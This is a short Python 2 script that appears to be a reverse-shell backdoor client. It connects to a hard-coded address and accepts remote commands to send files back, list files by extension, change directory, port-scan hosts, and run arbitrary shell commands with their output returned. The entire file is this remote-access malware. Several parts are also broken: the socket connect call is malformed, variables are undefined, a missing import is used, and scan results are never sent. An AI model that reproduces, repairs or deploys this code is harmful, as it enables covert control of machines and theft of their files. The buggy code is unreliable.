import socket, subprocess, os 

def transfer(s, path):

	if os.path.exists(path):
		fd = open(path,'rb')
		packet = fd.read(1024)
		while packet != '':
			s.send(packet)
			packet = fd.read(1024)

def dirWalk(s, dirpath, command):
	list1 = ''
	for dirpath, dirname, files in os.walk(path):
		for file in files:
			if file.endswith(extension):
				list1 = list1  + '\n' + os.path.join(dirpath, file)
		s.send(list1)

def scanner(s, ip, ports):
	scanResult = ''

	for port in ports:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			output = sock.connect_ex((ip, int(port)))
			if output == 0:
				scanResult = scanResult + "[+] Port: " + " " + port + "is open!!"
			else:
				scanResult = scanResult + "[+] Port: " + " " + port + "is closed!!"
		
		except Exception, e:
			sock.send(str(e))
			pass

def connect():
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect("http://192.168.56.103")
		while True:
			command = s.recv(1024)

			if 'terminate' in command:
				break

			elif 'grab' in command:
				grab, path = command.split('*')
				try:
					transfer(s,path)
				except Exception, e:
					s.send(str(e))
					pass
			
			elif 'search' in command:
				command = command[7:]
				path, extension = command.split('*')
				dirWalk(s, dirpath, command)					

			elif 'cd' in command:
				code, directory  = command.split('*')
				os.chdir(directory)
				s.send("[+]CWD in now " + os.getcwd())

			elif 'scan' in command:
				command = command[5:]
				ip, ports = command.split(':')
				scanner(s, ip, ports)

			else:
				CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=PIPE)
				s.send(CMD.stdout.read())
				s.send(CMD.stderr.read())
				
	except KeyboardInterrupt:
		exit(0)

if __name__ == '__main__':
	connect()